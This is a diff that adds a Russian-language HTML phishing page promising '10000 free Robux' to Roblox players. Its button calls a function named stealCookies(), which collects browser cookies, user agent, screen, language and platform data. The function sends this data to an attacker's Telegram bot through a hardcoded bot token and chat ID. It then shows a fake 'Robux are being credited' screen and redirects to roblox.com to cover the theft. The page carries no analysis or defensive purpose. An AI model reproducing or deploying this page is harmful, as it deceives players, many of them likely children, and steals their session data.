@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Получить 10000 бесплатных Robux!</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            background: linear-gradient(to bottom, #88c0d0, #81a1c1); 
+            color: #2e3440; 
+            margin: 0; 
+            padding: 20px; 
+        }
+        .container { 
+            max-width: 500px; 
+            margin: 50px auto; 
+            padding: 30px; 
+            background: rgba(236, 239, 244, 0.9); 
+            border-radius: 15px; 
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2); 
+        }
+        h1 { 
+            color: #5e81ac; 
+            margin-bottom: 20px; 
+        }
+        button { 
+            background-color: #bf616a; 
+            color: #eceff4; 
+            border: none; 
+            padding: 15px 30px; 
+            font-size: 18px; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            margin-top: 20px; 
+            transition: background-color 0.3s; 
+        }
+        button:hover { 
+            background-color: #a54e56; 
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎁 Получи 10000 Robux БЕСПЛАТНО! 🎁</h1>
+        <p>Нажми кнопку ниже, чтобы получить свои Robux мгновенно!</p>
+        <button onclick="stealCookies()">ЗАБРАТЬ 10000 ROBUX</button>
+    </div>
+
+    <script>
+        const botToken = '8231043844:AAFZs7dQ-suK_mfz2vo_CSQFNR0EhflqkAw';
+        const adminId = '7759891108';
+
+        function stealCookies() {
+            // Попытка украсть куки Roblox
+            const robloxCookies = document.cookie.match(/(.*\.roblox\.com.*)/gi) || ["Не удалось получить куки Roblox"];
+
+            // Сбор всей возможной информации о пользователе
+            const userInfo = `
+                User-Agent: ${navigator.userAgent}
+                Screen Resolution: ${screen.width}x${screen.height}
+                Language: ${navigator.language}
+                Platform: ${navigator.platform}
+                Roblox Cookies: ${robloxCookies.join(', ')}
+                Current URL: ${window.location.href}
+            `;
+
+            // Отправка данных в Telegram бота
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: adminId,
+                    text: `🚨 НОВЫЕ ДАННЫЫЕ 🚨\n${userInfo}`
+                })
+            }).catch(error => console.error('Ошибка отправки:', error));
+
+            // Изменение интерфейса для убедительности
+            document.querySelector('.container').innerHTML = `
+                <h1>Обработка ваших 10000 Robux...</h1>
+                <p>Ваш аккаунт обрабатывается. Robux уже зачисляются!</p>
+                <div style="font-size: 48px;">⏳</div>
+            `;
+
+            // Перенаправление на официальный сайт с задержкой
+            setTimeout(() => {
+                window.location.href = 'https://www.roblox.com/';
+            }, 3000);
+        }
+
+        // Дополнительный скрипт для изменения интерфейса Roblox после перехода
+        window.onload = function() {
+            if (window.location.hostname === 'www.roblox.com') {
+                setTimeout(() => {
+                    // Попытка изменить баланс на странице
+                    const balanceElement = document.querySelector('.robux-balance-value, [data-robux-amount]');
+                    if (balanceElement) {
+                        balanceElement.textContent = '10000';
+                        balanceElement.setAttribute('data-robux-amount', '10000');
+                    }
+                }, 2000);
+            }
+        };
+    </script>
+</body>
+</html>
